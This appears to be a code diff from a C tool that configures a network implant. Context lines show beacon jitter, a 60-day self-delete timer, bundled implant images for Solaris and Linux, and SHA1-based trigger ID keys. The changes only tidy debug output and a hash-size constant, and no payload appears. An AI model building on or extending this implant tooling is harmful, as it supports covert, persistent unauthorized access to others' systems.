@@ -10,6 +10,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <trigger_protocols.h>
 #include "_unpatched_solaris_sparc.h"
 #include "_unpatched_solaris_i386.h"
 #include "_unpatched_linux_i386.h"
@@ -73,25 +74,21 @@ struct cl_args     args = { SIG_HEAD, 0,  0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 #define DEFAULT_BEACON_JITTER		3                       // Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60 	// Default value is 60 days...
 
-//declare displaySha1Hash function
-void displaySha1Hash(char *label, unsigned char *sha1Hash);
+#ifdef DEBUG
 //define displaySha1Hash function
 void displaySha1Hash(char *label, unsigned char *sha1Hash)
 {
 	int i=0;
 
 	//Display Label
-	D( printf( " DEBUG: %s=[", label ); );
+	printf( " DEBUG: %s=[", label );
 
 	//Display 40 hexadecimal number array
-	for (i=0; i<20; i++)
-	{
-	   D( printf("%02x",sha1Hash[i]); );
-	}
-	D( printf( "]\n" ); );
-
+	for (i=0; i < ID_KEY_HASH_SIZE; i++)
+		printf("%02x",sha1Hash[i]);
+	printf( "]\n" );
 }
-
+#endif
 
 //********************************************************************************
 int user_instructions( void );
@@ -306,13 +303,13 @@ int main( int argc, char **argv )
 				sha1( (const unsigned char*) optarg, strlen(optarg), tempSha1Hash);    //Compute sha1 hash of keyPhrase and save as tempSha1Hash
 										//  This is what the trigger packet will send...
 
-				sha1( (const unsigned char*) tempSha1Hash, 20*sizeof(unsigned char), idKey);                 //idKey contains the final sha1 hash
+				sha1( (const unsigned char*) tempSha1Hash, ID_KEY_HASH_SIZE * sizeof(unsigned char), idKey);                 //idKey contains the final sha1 hash
 										// which is the implant's id key.  This will be 
 										// compared with the sha1 of the trigger packets sent
 										// sha1 hash [tempSha1Hash]
-				displaySha1Hash("tempSha1Hash", tempSha1Hash);
-				displaySha1Hash("idKey", idKey);
-				memcpy( args.idKey, idKey, 20*sizeof(unsigned char));
+				D(displaySha1Hash("tempSha1Hash", tempSha1Hash););
+				D(displaySha1Hash("idKey", idKey););
+				memcpy( args.idKey, idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
 	
 				// Save the implant's id key.
 				implantIDFile=fopen("idKeys.txt", "a+");        //Used to save implant keys and subsequent sha1 hashes...
